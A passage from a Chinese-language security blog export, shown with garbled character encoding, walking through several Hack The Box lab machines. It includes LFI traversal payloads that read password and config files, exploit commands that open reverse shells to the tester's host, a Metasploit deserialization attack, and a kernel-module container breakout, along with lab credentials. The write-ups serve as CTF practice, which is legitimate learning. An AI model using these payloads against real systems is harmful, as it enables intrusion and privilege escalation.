acct [Status: 301, Size: 65, Words: 3, Lines: 1] bin [Status: 301, Size: 63, Words: 3, Lines: 1] cache [Status: 301, Size: 67, Words: 3, Lines: 1] config [Status: 301, Size: 69, Words: 3, Lines: 1] d [Status: 301, Size: 59, Words: 3, Lines: 1] data [Status: 301, Size: 65, Words: 3, Lines: 1] dev [Status: 301, Size: 63, Words: 3, Lines: 1] etc [Status: 301, Size: 63, Words: 3, Lines: 1] init [Status: 403, Size: 31, Words: 4, Lines: 1] lib [Status: 301, Size: 63, Words: 3, Lines: 1] mnt [Status: 301, Size: 63, Words: 3, Lines: 1] oem [Status: 301, Size: 63, Words: 3, Lines: 1] proc [Status: 301, Size: 65, Words: 3, Lines: 1] product [Status: 301, Size: 71, Words: 3, Lines: 1] sbin [Status: 301, Size: 65, Words: 3, Lines: 1] storage [Status: 301, Size: 71, Words: 3, Lines: 1] sys [Status: 301, Size: 63, Words: 3, Lines: 1] system [Status: 301, Size: 69, Words: 3, Lines: 1] vendor [Status: 301, Size: 69, Words: 3, Lines: 1] :: Progress: [61407/61407] :: Job [1/1] :: 199 req/sec :: Duration: [0:05:35] :: Errors: 0 :: çœ‹åˆ°è¿™ä¸ªç›®å½•ç»“æ„ï¼Œæˆ‘æ„Ÿè§‰è¿™HTTPæœåŠ¡æ˜¯è¿è¡Œåœ¨æ ¹ç›®å½•ä¸‹çš„ ç„¶åæˆ‘åˆå»çœ‹äº†ä¸€ä¸‹è¿™å°é¶æœºçš„ç³»ç»Ÿï¼ŒAndroidç³»ç»Ÿï¼Œå’±ä»¬å»æŸ¥æ‰¾ä¸€ä¸‹Androidçš„æ•æ„Ÿæ–‡ä»¶è¯•è¯•ã€‚ ç»è¿‡ç¡®è®¤ï¼Œç¡®å®æ˜¯å­˜åœ¨æ–‡ä»¶è¯»å–çš„æ¼æ´ï¼Œä½†æˆ‘ä¸å¤ªäº†è§£Androidï¼Œé‚£åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿç®€å•ï¼æ‘‡äººå„¿ï¼åœ¨è¯¢é—®ç©Androidçš„æœ‹å‹æ€ä¹ˆæä»¥åï¼Œåˆç»è¿‡å¤§é‡çš„èµ„æ–™æŸ¥æ‰¾ä»¥åŠfuzzä»¥åï¼Œå¾—åˆ°äº†ç­”æ¡ˆ è¿™é‡Œ&#x2F;sdcard&#x2F;æç¤º No directory listing. ï¼Œä½†&#x2F;sdcard1&#x2F;æç¤º 404 file not found. é‚£ä¹ˆï¼Œè¿™é‡Œå°±å¯ä»¥ç¡®å®šï¼Œ&#x2F;sdcard&#x2F;è¿™ä¸ªç›®å½•æ˜¯å­˜åœ¨çš„äº†ï¼Œå’±ä»¬ç»§ç»­å¾€ä¸‹åš æ¼æ´åˆ©ç”¨åœ¨æˆ‘æ„šè ¢çš„å¯¹50777ç«¯å£çš„Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or olderè¿›è¡Œäº†å¤§é‡çš„æœç´¢ä»¥åï¼Œæˆ‘æ‰çœ‹åˆ°ä¸€ä¸ªå…³é”®è¯Minecraftï¼Œæˆ‘ä¸¢ï¼Œè¿™ä¸å°±æ˜¯æˆ‘çš„ä¸–ç•ŒæœåŠ¡å™¨å—ï¼Ÿæ”¾å¼ƒ ç„¶åæŠŠçœ¼å…‰æ”¾åœ¨äº† 42134 ç«¯å£ä¸Šçš„ ES File Explorer Name Response httpd ä¸Š å¥½å®¶ä¼™ï¼Œè¿™ç›´æ¥å°±æ‰¾åˆ°äº†ä¸€ä¸ªexploit &gt;https://www.exploit-db.com/exploits/50070 è¯¥exploitæä¾›äº†ä¸å°‘å¯æ‰§è¡Œå‘½ä»¤ cmds = [&#39;listFiles&#39;,&#39;listPics&#39;,&#39;listVideos&#39;,&#39;listAudios&#39;,&#39;listApps&#39;,&#39;listAppsSystem&#39;,&#39;listAppsPhone&#39;,&#39;listAppsSdcard&#39;,&#39;listAppsAll&#39;,&#39;getFile&#39;,&#39;getDeviceInfo&#39;] ä½¿ç”¨exploitæä¾›listPicsæŒ‡ä»¤è·å–ä¸€äº›å›¾ç‰‡æ–‡ä»¶ python3 exploit.py listPics 10.10.10.247 æœ€ç»ˆåœ¨ http://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg ä¸‹æ‰¾åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç  username = kristi password = Kr1sT!5h@Rp3xPl0r3! å’±ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½• ssh kristi@10.10.10.247 -p 2222 æˆåŠŸæ‹¿åˆ°shellï¼Œå’±ä»¬æ‰¾æ‰¾çœ‹æ–‡ä»¶ åœ¨ /sdcard/ ç›®å½•ä¸‹æ‰¾åˆ°äº† user.txt æ–‡ä»¶ï¼ŒæˆåŠŸæ‹¿åˆ°useræƒé™çš„flagï¼ŒåŒæ—¶æƒ³åˆ°ï¼Œå’±ä»¬æ˜¯å¦å¯ç›´æ¥åˆ©ç”¨ 59777 ç«¯å£åˆ©ç”¨æ–‡ä»¶è¯»å–ç›´æ¥è¯»å–åˆ°è¯¥flagå‘¢ï¼Ÿ http://10.10.10.247:59777/sdcard/user.txt äº‹å®è¯æ˜ï¼Œæ˜¯å¯ä»¥çš„ æƒé™æå‡å’±ä»¬ç›®å‰æ²¡åˆ©ç”¨è¿‡ä¸”æ— æ³•ç›´æ¥åˆ©ç”¨çš„ç«¯å£åªæœ‰5555ç«¯å£äº†ï¼Œæˆ‘ä¼°è®¡çªç ´å£åœ¨è¿™ä¸Šé¢ï¼Œå’±ä»¬å…ˆä½¿ç”¨sshç»™å®ƒè½¬å‘å‡ºæ¥å§ ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 -N -v -v ä»£ç†ä¸Šä»¥åï¼Œå’±ä»¬æ¥åˆ†æä¸€ä¸‹å•Šã€‚ æ—¢ç„¶è¿™å°Androidè¿æ¥ç€sdå¡ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯å¼€å¯ç€ADBè°ƒè¯•æ¡¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å’±ä»¬æˆ–è®¸å¯ä»¥ç›´æ¥ä½¿ç”¨ADBè¿›è¡Œç ´è§£ã€‚ è¯´æ¥ä¹Ÿå·§ï¼Œè¿™ä¸ªæŠ€å·§è¿˜æ˜¯æˆ‘ä¹‹å‰é—²ç€æ²¡äº‹å„¿ç ”ç©¶ç ´è§£Androidå¯†ç çš„æ—¶å€™æ°å·§çœ‹åˆ°çš„ã€‚ adb connect 127.0.0.1:5555 è¿æ¥æˆåŠŸåï¼Œä½¿ç”¨ adb -s 127.0.0.1:5555 shell ç™»å…¥shell æˆåŠŸè·å¾—rootæƒé™ ä½¿ç”¨find / -name root.txtæŒ‡ä»¤ï¼ŒæˆåŠŸè·å¾—rootæ–‡ä»¶ä½ç½®/data/root.txt æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Monitors - Hackthebox","slug":"Hackthebox - Monitors","date":"2021-06-24T11:38:36.000Z","updated":"2023-05-20T01:59:52.000Z","comments":true,"path":"2021/06/24/Hackthebox - Monitors/","link":"","permalink":"http://www.lucifiel.com/2021/06/24/Hackthebox%20-%20Monitors/","excerpt":"","text":"Hackthebox - Monitorsé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapé¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›† nmap -A -sS -sC -sV 10.10.10.238 â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nmap -A -sS -sC -sV 10.10.10.238 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 03:09 CST Nmap scan report for 10.10.10.238 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA) | 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA) |_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html; charset=iso-8859-1). No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=6/25%OT=22%CT=1%CU=35010%PV=Y%DS=2%DC=T%G=Y%TM=60D4D89 OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1025/tcp) HOP RTT ADDRESS 1 239.07 ms 10.10.14.1 2 239.14 ms 10.10.10.238 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.56 seconds æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯äº†22å’Œ80ç«¯å£ï¼Œå’±ä»¬å…ˆå»80ç«¯å£çœ‹çœ‹ Http ä¸å…è®¸ä½¿ç”¨IPè¿›è¡Œè®¿é—®ï¼Œé‚£å’±ä»¬å…ˆæ·»åŠ ä¸€ä¸‹hostså§ echo 10.10.10.238 monitors.htb &gt; /etc/hosts ç„¶åè®¿é—®monitors.htbï¼Œæˆ‘ä»¬æŠŠç›®å…‰æ”¾åœ¨å³ä¸‹è§’Powered by Wordpress è¿™å¾ˆæ˜æ˜¾çš„æ˜¯wordpresså•Šï¼Œä½¿ç”¨wpscanæ‰«æçœ‹çœ‹ wpscan --url http://monitors.htb/ -e p,t,u å’±ä»¬æŠŠç›®å…‰æ”¾åœ¨è¿™ä¸€è¡Œwp-with-spritz æ‰¾åˆ°äº†ä¸€ä¸ªexpï¼Œå’±ä»¬è¿›å»çœ‹çœ‹ https://www.exploit-db.com/exploits/44544 æ¼æ´åˆ©ç”¨1. Version Disclosure /wp-content/plugins/wp-with-spritz/readme.txt 2. Source Code if(isset($_GET[&#39;url&#39;])){ $content=file_get_contents($_GET[&#39;url&#39;]); 3. Proof of Concept /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec æ ¹æ®è¿™ä¸ªexploitç»™å‡ºçš„éªŒè¯ï¼Œå’±ä»¬è¯•è¯•æ˜¯å¦å¯ç”¨ [http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd](http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd) æˆåŠŸè·å–&#x2F;etc&#x2F;passwdæ–‡ä»¶ ç„¶ååªæ˜¯ä¸€ä¸ªWordpressçš„ç«™ç‚¹ï¼Œå’±ä»¬ç›´æ¥è¯•è¯•æ˜¯å¦å¯ä»¥æŸ¥çœ‹å®ƒçš„é…ç½®æ–‡ä»¶ http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/var/www/wordpress/wp-config.php æˆåŠŸè·å¾—æ•°æ®åº“è´¦æˆ·å¯†ç  DB_NAME = â€œwordpressâ€ DB_USER = â€œwpadminâ€ DB_PASSWORD = â€œBestAdministrator@2020!â€ è¯¥è´¦æˆ·ä¸å­˜åœ¨äº&#x2F;etc&#x2F;passwdå†…ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æ— æ³•ç›´æ¥ä½¿ç”¨sshè¿›è¡Œç™»å½•çš„ï¼Œå’±ä»¬æƒ³æƒ³æœ‰æ²¡æœ‰å…¶ä»–åŠæ³•è¿›è¡Œgetshell å°è¯•ä½¿ç”¨è¯¥è´¦æˆ·ç™»å½•åå°ï¼Œä¹Ÿä¸å¯è¡Œï¼Œå¥½å®¶ä¼™è¿™æ˜¯é€¼æˆ‘åŠ¨çœŸæ ¼äº†ï¼Ÿ æˆ‘æ‰¾åˆ°äº†ä¸€ç¯‡LFIè½¬RCEçš„æ–‡ç«  https://infosecwriteups.com/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899 å’±ä»¬æŠ“ä¸ªåŒ…å§ æŠ“åŒ…åå°†æˆ‘ä»¬è‡ªå·±è‡ªå®šä¹‰çš„1è®¾ç½®ä¸ºçˆ†ç ´ç‚¹ï¼Œç„¶åé€‰æ‹©Numbersï¼Œè®¾ç½®ä»1åˆ°15 æ­£å¸¸æ¥è¯´æ˜¯ä¼šçœ‹åˆ°ä¸€ä¸ªæ¯”è¾ƒå¤§çš„åŒ…çš„ï¼Œä½†æˆ‘è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘é€šè¿‡å…¶ä»–æ–¹å¼(FUZZ)è·‘å‡ºæ¥äº† [http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/000-default.conf](http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/000-default.conf) ç„¶åå’±ä»¬è·å¾—äº†å¦ä¸€ä¸ªåŸŸå cacti-admin.monitors.htbï¼Œå’±ä»¬æ·»åŠ è¿›hosts echo 10.10.10.238 cacti-admin.monitors.htb &gt;&gt; /etc/hosts ç„¶åå’±ä»¬è®¿é—®ä¸€ä¸‹http://cacti-admin.monitors.htb/ è¿™ä¸ªä»™äººæŒç•Œé¢ï¼Œæˆ‘ä¼°è®¡æˆ‘ä»¬ä¹‹å‰è¯»å–åˆ°çš„è´¦å·å¯†ç å¯ä»¥èµ·ä½œç”¨äº† ç”¨æˆ·åï¼šadmin å¯†ç ï¼šBestAdministrator@2020! å¯æ€»ç®—æ˜¯ç™»å½•è¿›åå°äº† è®©æˆ‘ä»¬ç‚¹ä¸€ä¸‹è¿™ä¸ªä»™äººæŒæ£€æŸ¥ä¸€ä¸‹ç‰ˆæœ¬ ç‰ˆæœ¬1.2.12 åœ¨githubä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªç›¸å…³çš„é—®é¢˜ æ¼æ´ç¼–å· CVE-2020-14295 è¿™é‡Œæ˜¯ç¡®å®šå­˜åœ¨ä¸€ä¸ªæ³¨å…¥æ¼æ´ï¼Œè®©æˆ‘ä»¬æ¥å°è¯•ä¸€ä¸‹ ä½¿ç”¨è¯¥exploit https://www.exploit-db.com/exploits/49810 çœ‹çœ‹æ˜¯å¦å¯ä»¥ç›´æ¥è·å¾—ä¸€ä¸ªshell python3 exploit.py -t http://cacti-admin.monitors.htb -u admin -p &quot;BestAdministrator@2020\\!&quot; --lhost 10.10.14.163 --lport 4444 tips:æ­¤å¤„å¯†ç çš„æ„Ÿå¹å·è¦ç”¨åæ–œæ è¿›è¡Œè½¬ä¹‰ï¼Œä¸ç„¶ä¼šè¢«ç¼–è¯‘æ‰ æˆåŠŸè·å¾—ä¸€ä¸ªshell å¯ä»¥ä½¿ç”¨python3 -c â€œimport pty;pty.spawn(â€˜&#x2F;bin&#x2F;bashâ€™)â€;è·å–ä¸€ä¸ªæ›´åŠ ç¨³å®šçš„shell æƒé™æå‡ å’±ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåªæœ‰marcusçš„ç›®å½•å’±ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ‰€ä»¥å’±ä»¬è‚¯å®šæ˜¯è¦è·å–è¿™ä¸ªç”¨æˆ·çš„æƒé™äº† grep &#39;marcus&#39; /etc -R 2&gt;/dev/null å’±ä»¬æŸ¥æ‰¾ä¸€ä¸‹ç›¸å…³çš„æ–‡ä»¶ å’±ä»¬æ‰¾åˆ°ä¸€ä¸ªè„šæœ¬ /home/marcus/.backup/backup.sh æŸ¥çœ‹ä¸€ä¸‹ å’±ä»¬è·å¾—äº†ä¸€ä¸ªå¯†ç  VerticalEdge2020 åº”è¯¥æ˜¯marcusç”¨æˆ·çš„å¯†ç ï¼Œå’±ä»¬å»ä½¿ç”¨sshç™»å½•è¯•è¯• ssh [marcus@10.10.10.238](mailto:marcus@10.10.10.238) ç™»å½•æˆåŠŸ æˆåŠŸè·å¾—useræƒé™çš„flag å’±ä»¬æŸ¥çœ‹ä¸€ä¸‹note.txtæ–‡ä»¶ è¿™ä¸ªæç¤ºæåˆ°äº†dockerï¼Œé‚£å’±ä»¬å»æŸ¥çœ‹ä¸€ä¸‹dockerå§ ps aux|grep docker æˆ‘çœ‹åˆ°ä¸€ä¸ªä½¿ç”¨ docker-proxy è¿è¡Œçš„ docker å®¹å™¨ã€‚æ‰€ä»¥æˆ‘æœç´¢äº†ä¸€äº›å…³äº dokcer-proxy çš„ä¿¡æ¯ æˆ‘æ‰¾åˆ°çš„å‚è€ƒæ–‡æœ¬ https://docs.docker.com/network/proxy/ é˜…è¯»æ–‡æœ¬åï¼ŒçŸ¥é“äº†ä½¿ç”¨docker-proxyå¯ä»¥é€šè¿‡ä»£ç†è¿è¡Œdockerå®¹å™¨ã€‚ çŸ¥é“è¿™ä¸ªä¿¡æ¯åï¼Œè®©æˆ‘ä»¬çœ‹çœ‹æ˜¯å¦æœ‰æ— æ³•ä»å¤–éƒ¨è®¿é—®çš„ç«¯å£è¿è¡Œç€ netstat -an æœ‰ä¸€ä¸ª8443ç«¯å£ è¿™åº”è¯¥å°±æ˜¯docker-proxyæ­£åœ¨ä¾¦å¬çš„ç«¯å£äº†ï¼Œæˆ‘ä»¬ä½¿ç”¨sshåˆ›å»ºä¸€ä¸ªä»£ç†éš§é“ ssh -L 8443:127.0.0.1:8443 [marcus@10.10.10.238](mailto:marcus@10.10.10.238) ç„¶åå’±ä»¬å»è®¿é—®https://127.0.0.1:8443 ä¼šçœ‹åˆ°æœ‰ä¸€ä¸ªtomcatæœåŠ¡å™¨ å°è¯•åœ¨GoogleæŸ¥æ‰¾æ¼æ´åï¼Œç»è¿‡åŠªåŠ›æ‰¾åˆ°äº†ä¸€ä¸ªJava ååºåˆ—åŒ– https://www.rapid7.com/db/modules/exploit/linux/http/apache_ofbiz_deserialization&#x2F; å¦‚ä¸Šæ‰€è¿°ï¼Œæˆ‘å°†ä½¿ç”¨msfç›´æ¥è¿›è¡Œæ”»å‡» msfconsoleå¯åŠ¨msf exploit/linux/http/apache_ofbiz_deserialization set rhosts 127.0.0.1 set lhost 10.10.14.163 set lport 5555 set ForceExploit true exploit å’±ä»¬æˆåŠŸåˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ä»¥rootæƒé™åœ¨dockerä¸Šè·å¾—äº†ä¸€ä¸ªshell è¾“å…¥shellè¿›å…¥æƒé™ è¾“å…¥capsh â€“printæŸ¥çœ‹å®¹å™¨çš„åŠŸèƒ½ ä½ ä»¬çŒœçŒœæˆ‘å‘ç°äº†å•¥ï¼Ÿ dockerå…·æœ‰SYS_MODULEæƒé™ã€‚å› æ­¤ï¼Œå®¹å™¨å¯ä»¥åœ¨dockerä¸»æœºçš„å†…æ ¸ä¸­æ’å…¥&#x2F;åˆ é™¤å†…æ ¸æ¨¡å— ç„¶åæˆ‘æœç´¢äº† docker sys_module çš„æ¼æ´ï¼Œè¿˜çœŸæ‰¾åˆ°äº† https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd?gi=c12387585c2 æ ¹æ®æ–‡ç« æç¤ºï¼Œæˆ‘åˆ¶ä½œäº†ä¸¤ä¸ªè„šæœ¬ è®°å¾—ä¿®æ”¹IPåœ°å€å’Œç«¯å£ï¼Œæˆ‘è¿™é‡Œå¿˜è®°ä¿®æ”¹äº† ç„¶åæŠŠè„šæœ¬ä¸Šä¼ åˆ°dockeré‡Œ python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; é¦–å…ˆä½¿ç”¨pythonè·å¾—ä¸€ä¸ªç¨³å®šçš„shell ç„¶åè¿›å…¥&#x2F;rootç›®å½• åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨ ç„¶åä½¿ç”¨wgetä¸‹è½½ä¸¤ä¸ªè„šæœ¬ è¾“å…¥make all è¾“å‡ºäº†å¾ˆå¤šçš„æ–‡ä»¶ï¼Œä½†æˆ‘ä»¬åªéœ€è¦reverse-shell.ko é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ç„¶åä½¿ç”¨insmod reverse-shell.koè¿è¡Œæˆ‘ä»¬è¦çš„æ–‡ä»¶ æˆåŠŸææƒåˆ°root æˆåŠŸè·å¾—rootæƒé™çš„flag æ”¶å·¥ç¡è§‰ è¿™å‡ å¤©æ²¡æœ‰æ›´æ–°ï¼Œæ˜¯å› ä¸ºè¢«æŸå‚æ¶å¿ƒäº†ä¸€æŠŠï¼Œè®©æˆ‘è‡ªæˆ‘æ€€ç–‘äº†ä¸€ä¸‹ä»¥ä¸ºæˆ‘è‡ªå·±çœŸçš„å¾ˆèœã€‚ ä½†ç»è¿‡æˆ‘æ—¶å€™ä»¥åå‘ç°ï¼Œå…¶å®æˆ‘æ›´èœï¼ æ²¡æƒ³åˆ°å§ï¼Œå“å˜¿ å‘ç°æˆ‘è‡ªå·±æ›´èœä»¥åï¼Œæˆ‘å°±å¯ä»¥æ”¾å¿ƒçš„ç¡è§‰äº†ï¼Œå¤§å®¶æ™šå®‰","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Breadcrumbs - Hackthebox","slug":"Hackthebox - Breadcrumbs","date":"2021-06-19T11:38:36.000Z","updated":"2023-05-20T01:27:01.000Z","comments":true,"path":"2021/06/19/Hackthebox - Breadcrumbs/","link":"","permalink":"http://www.lucifiel.com/2021/06/19/Hackthebox%20-%20Breadcrumbs/","excerpt":"","text":"Hackthebox - Breadcrumbsé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ nmap -A -sS -sC -sV 10.10.10.228 â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nmap -A -sS -sC -sV 10.10.10.228 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-19 13:47 CST Nmap scan report for 10.10.10.228 Host is up (0.25s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA) | 256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA) |_ 256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519) 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 |_http-title: Library 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 |_http-title: Library | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds? 3306/tcp open mysql? No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=6/19%OT=22%CT=1%CU=39016%PV=Y%DS=2%DC=T%G=Y%TM=60CD853 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS= OS:U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS OS:%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y% OS:DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD= OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD= OS:Z) Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 11m52s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-06-19T06:00:15 |_ start_date: N/A TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 248.74 ms 10.10.14.1 2 248.83 ms 10.10.10.228 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 59.03 seconds å¯ä»¥çœ‹åˆ°ï¼Œè¯¥é¶æœºå¼€å¯äº†22ã€80ã€135ã€139ã€443ã€445ã€3306ç«¯å£ å’±ä»¬è®¿é—®ä¸€ä¸‹80ç«¯å£ Http ç‚¹å‡»check booksçœ‹çœ‹ æŸ¥æ‰¾å›¾ä¹¦ï¼Œå’±ä»¬éšä¾¿æŸ¥æ‰¾ä¸€ä¸ª å’±ä»¬æ‹¦æˆªä¸€ä¸ªåŒ…çœ‹çœ‹ çœ‹åˆ°æœ‰ä¸ªå‚æ•°bookï¼Œæ˜¯è¯»å–ç½‘é¡µçš„ï¼Œé‚£æ˜¯å¦å­˜åœ¨LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰å‘¢ï¼Ÿæµ‹è¯•ä¸€ä¸‹ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæç¤ºçš„æ˜¯æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç¡®å®å­˜åœ¨LFI åªä¸è¿‡å’±ä»¬è¦è®¿é—®çš„é¡µé¢åœ¨ä¸Šçº§ç›®å½•é‡Œè€Œå·²ï¼Œå’±ä»¬æµ‹è¯•ä¸€ä¸‹ æ¼æ´åˆ©ç”¨niceï¼Œè¯¥æ¼æ´ç¡®å®æ˜¯å­˜åœ¨çš„ï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨ ç”±äºè¿™æ˜¯ä¸€å°windowsçš„æœºå™¨ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹ä»–è‡ªèº«å­˜åœ¨çš„ä¸€äº›æ–‡ä»¶ ../../../../../../WINDOWS/system32/drivers/etc/hosts &quot;# Copyright (c) 1993-2009 Microsoft Corp.\\r\\n#\\r\\n# This is a sample HOSTS file used by Microsoft TCP\\/IP for Windows.\\r\\n#\\r\\n# This file contains the mappings of IP addresses to host names. Each\\r\\n# entry should be kept on an individual line. The IP address should\\r\\n# be placed in the first column followed by the corresponding host name.\\r\\n# The IP address and the host name should be separated by at least one\\r\\n# space.\\r\\n#\\r\\n# Additionally, comments (such as these) may be inserted on individual\\r\\n# lines or following the machine name denoted by a &#39;#&#39; symbol.\\r\\n#\\r\\n# For example:\\r\\n#\\r\\n# 102.54.94.97 rhino.acme.com # source server\\r\\n# 38.25.63.10 x.acme.com # x client host\\r\\n\\r\\n# localhost name resolution is handled within DNS itself.\\r\\n#\\t127.0.0.1 